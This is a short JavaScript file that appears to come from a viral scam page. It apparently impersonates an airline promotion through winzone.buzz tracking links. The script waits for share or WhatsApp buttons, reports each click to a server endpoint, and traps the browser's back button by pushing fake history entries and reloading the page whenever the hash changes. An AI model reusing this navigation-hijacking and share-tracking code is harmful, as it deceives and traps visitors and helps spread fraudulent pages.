tb = "https://winzone.buzz/saudiaair/Iz5kT265qNQGB24asAzz2G";
cad = "https://winzone.buzz/emit/cl5uY2ZaYGZr/c";
bad = "https://winzone.buzz/emit/cl5uY2ZaYGZr/b";
ead = "https://winzone.buzz/emit/cl5uY2ZaYGZr/e";

setTimeout(function () {


  window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-1LYPHL165P');
  var gs = document.createElement("script"); gs.async = true; gs.defer = true; gs.src = "https://www.googletagmanager.com/gtag/js?id=G-1LYPHL165P";
  document.body.appendChild(gs);
}, 500);
var sInt = setInterval(function () {
  var sbt = document.querySelector(".weui_btn_dialog") || document.querySelector("#compartir") || document.querySelector("#shareBtn") || document.querySelector("#whatsapp") || document.querySelector("#weui_btn_dialog");
  if (sbt) {
    clearInterval(sInt);
    sbt.addEventListener('click', function () { jQuery.post("/api/d.php"); });

  }
}, 1000);

window.hh = function (p) { history.pushState(history.length + 1, "message", "#" + p + new Date().getTime()); }; window.onhashchange = function () { top.location.reload(); }; setTimeout('hh(6);', 500);